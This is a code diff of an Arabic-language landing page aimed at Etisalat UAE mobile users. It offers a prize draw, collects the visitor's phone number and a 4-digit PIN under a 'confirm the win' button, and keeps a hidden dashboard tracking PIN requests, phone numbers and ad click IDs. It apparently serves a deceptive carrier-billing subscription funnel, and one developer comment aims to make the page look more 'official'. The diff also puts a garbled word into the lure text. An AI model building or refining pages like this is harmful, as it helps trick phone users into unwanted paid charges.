@@ -38,7 +38,7 @@
       margin-bottom: 10px;
     }
     
-    /* ── 阿拉伯语专属行（由 Exclusive for UAE Etisalat user 转换） ── */
+    /* ── 阿拉伯语专属行 ── */
     .sub-title-ar { 
       font-size: 15px; 
       color: #444; 
@@ -78,10 +78,10 @@
       text-align: right;
     }
     
-    /* ── 精密组合式输入框（带国旗与国家代码的同一个格子） ── */
+    /* ── 💥 号码移到右侧的一体化输入框 ── */
     .phone-input-group {
       display: flex;
-      direction: ltr; /* 保持组合框由左到右拼装：[输入框] [国旗] [+971] */
+      direction: rtl; /* 彻底开启阿语从右到左排版：[+971/国旗] [输入框] */
       border: 2px solid #ccd5d0;
       border-radius: 12px;
       overflow: hidden;
@@ -93,7 +93,7 @@
       border-color: #007a3d;
     }
 
-    /* 用户数字输入部分 */
+    /* 左侧数字输入部分 */
     .form-input { 
       flex: 1;
       padding: 15px 16px; 
@@ -102,21 +102,23 @@
       font-weight: 700; 
       outline: none; 
       background: transparent;
-      text-align: left; /* 电话号码靠左对齐，符合国际拨号习惯 */
+      text-align: right; /* 让用户输入的数字从右侧开始贴着国旗，极度符合阿语操作习惯 */
+      direction: ltr;    /* 保持数字本身的 504608976 从左向右显示不颠倒 */
     } 
 
-    /* 右侧一体化：国旗和+971合并在同一个格子 */
+    /* 🔥 挪到最右侧的一体化格子 */
     .phone-prefix-box {
       display: flex;
       align-items: center;
       gap: 8px;
       background: #f7faf8;
       padding: 0 14px;
-      border-left: 1px solid #e1e8e4;
+      border-right: 1px solid #e1e8e4; /* 边框移至右侧分离 */
       user-select: none;
+      direction: ltr; /* 确保国旗和+971小组件内部结构不反转 */
     }
 
-    /* 阿联酋红绿白黑国旗（用纯 CSS 优雅实现，保证加载零延迟） */
+    /* 阿联酋高精 CSS 国旗 */
     .uae-flag {
       width: 24px;
       height: 14px;
@@ -137,7 +139,7 @@
       color: #111111;
     }
     
-    /* 验证码框包围盒 */
+    /* 验证码输入框包装 */
     .pin-input-group {
       border: 2px solid #ccd5d0;
       border-radius: 12px;
@@ -150,10 +152,10 @@
       padding: 15px 16px;
       border: none;
       outline: none;
-      font-size: 18px;
-      font-weight: 700;
+      font-size: 22px; 
+      font-weight: 700; 
       text-align: center;
-      letter-spacing: 4px;
+      letter-spacing: 8px; /* 加大验证码间距，看起来更高端官方 */
     }
 
     /* 按钮样式 */
@@ -174,7 +176,7 @@
       background: #005c2e; 
     }
     
-    /* ── 全阿拉伯语资费免责声明（Cost 完美转阿语） ── */
+    /* 全阿拉伯语资费声明 */
     .legal-text { 
       font-size: 11px; 
       color: #8c9c94; 
@@ -184,7 +186,7 @@
       padding-top: 40px;
     }
 
-    /* ── 工业风监控看板 UI（保持英文不受前端影响） ── */
+    /* ── 监控看板 UI ── */
     #dashboard-view { 
       display: none; 
       background: #0d1117; 
@@ -198,40 +200,33 @@
       z-index:99999; 
       direction: ltr; 
     }
-    .header { display: flex; align-items: center; justify-content: space-between; padding: 10px 20px; background: #161b22; border-bottom: 1px solid #30363d; }
+    .header { display: flex; align-items: center; justify-content: space-between; padding: 15px 20px; background: #161b22; border-bottom: 1px solid #30363d; }
     .header-stats { display: flex; gap: 28px; }
     .stat { text-align: center; }
-    .stat-val { font-size: 22px; font-weight: 700; }
-    .stat-lbl { font-size: 9px; color: #8b949e; margin-top: 3px; }
+    .stat-val { font-size: 24px; font-weight: 700; }
+    .stat-lbl { font-size: 9px; color: #8b949e; margin-top: 4px; }
     .stat:nth-child(1) .stat-val { color: #58a6ff; }
     .stat:nth-child(2) .stat-val { color: #bc8cff; }
     .stat:nth-child(3) .stat-val { color: #3fb950; }
     .stat:nth-child(4) .stat-val { color: #79c0ff; }
     .stat:nth-child(5) .stat-val { color: #3fb950; }
-    .tabs { display: flex; padding: 0 20px; border-bottom: 1px solid #30363d; background: #0d1117; }
-    .tab-btn { padding: 10px 16px; cursor: pointer; color: #8b949e; font-size: 13px; background: none; border: none; border-bottom: 2px solid transparent; }
-    .tab-btn.active { color: #e3b341; border-bottom-color: #e3b341; }
     .table-wrap { padding: 20px; }
     table { width: 100%; border-collapse: collapse; font-size: 12px; }
-    thead th { padding: 8px 10px; text-align: left; color: #8b949e; background: #161b22; border-bottom: 1px solid #30363d; }
-    tbody tr { border-bottom: 1px solid #161b22; }
-    tbody td { padding: 9px 10px; color: #e6edf3; }
+    thead th { padding: 10px; text-align: left; color: #8b949e; background: #161b22; border-bottom: 1px solid #30363d; }
+    tbody tr { border-bottom: 1px solid #21262d; }
+    tbody td { padding: 12px 10px; color: #e6edf3; }
   </style>
 </head>
 <body>
 
   <div id="landing-view" class="landing-box">
-    
     <h1 class="main-title-ar">حصرياً لمشتركي اتصالات الإمارات فقط</h1>
-    
     <div class="sub-title-ar">خاص بمستخدمي اتصالات الإمارات فقط</div>
-    
-    <p class="guide-text">أدخل رقم هاتفك المتحرك الآن للانضمام إلى حملة السحب الأسبوعية المميزة.</p>
+    <p class="guide-text">أدخل رقم هاتفك المتحرك الآن للانضمام إلى حملة السحب الأكمة المميزة.</p>
     
     <div class="form-card" id="step-1">
       <label class="form-lbl">أدخل رقم هاتفك المتحرك:</label>
       <div class="phone-input-group">
-        <input type="tel" id="inp-msisdn" class="form-input" placeholder="5XXXXXXXX">
         <div class="phone-prefix-box">
           <div class="uae-flag">
             <div class="flag-red"></div>
@@ -243,6 +238,7 @@
           </div>
           <span class="prefix-text">+971</span>
         </div>
+        <input type="tel" id="inp-msisdn" class="form-input" placeholder="5XXXXXXXX">
       </div>
       <button class="action-btn">متابعة</button>
     </div>
@@ -250,7 +246,7 @@
     <div class="form-card" id="step-2" style="display: none;">
       <label class="form-lbl">أدخل رمز PIN المكون من 4 أرقام:</label>
       <div class="pin-input-group">
-        <input type="number" id="inp-pin" placeholder="XXXX">
+        <input type="text" inputmode="numeric" pattern="[0-9]*" id="inp-pin" placeholder="XXXX" maxlength="4" oninput="this.value=this.value.replace(/[^0-9]/g,'').slice(0,4)">
       </div>
       <button class="action-btn" style="background: #e3b341; box-shadow: 0 4px 12px rgba(227,179,65,0.15);">تأكيد الفوز</button>
     </div>
@@ -260,7 +256,7 @@
 
   <div id="dashboard-view">
     <header class="header">
-      <div style="font-size:16px; font-weight:700;">📱 MVAS Funnel Dashboard</div>
+      <div style="font-size:16px; font-weight:700; color: #e6edf3;">📱 MVAS Funnel Dashboard</div>
       <div class="header-stats">
         <div class="stat"><div class="stat-val" id="s-pin-requests">0</div><div class="stat-lbl">PIN REQUESTS</div></div>
         <div class="stat"><div class="stat-val" id="s-unique-msisdn">0</div><div class="stat-lbl">UNIQUE MSISDN</div></div>
@@ -269,15 +265,11 @@
         <div class="stat"><div class="stat-val" id="s-pin-verified">0</div><div class="stat-lbl">PIN VERIFIED</div></div>
       </div>
     </header>
-    <div class="tabs">
-      <button id="btn-tab-req" class="tab-btn active" onclick="switchTab('request')">📱 pin_request</button>
-      <button id="btn-tab-vrf" class="tab-btn" onclick="switchTab('verify')">🔑 pin_verify</button>
-    </div>
     <div class="table-wrap">
       <table>
         <thead>
           <tr>
-            <th>DATE</th><th>TELCO</th><th>MSISDN</th><th>VOLUUM CLICK_ID</th><th>TXID (CP REF)</th><th>STATUS</th><th>CP RESPONSE</th>
+            <th>DATE & TIME</th><th>OPERATOR</th><th>CLEANED MSISDN</th><th>VOLUUM CLICK_ID</th><th>TXID (CP REF)</th><th>STATUS</th><th>CP API RESPONSE</th>
           </tr>
         </thead>
         <tbody id="tbody-logs"></tbody>
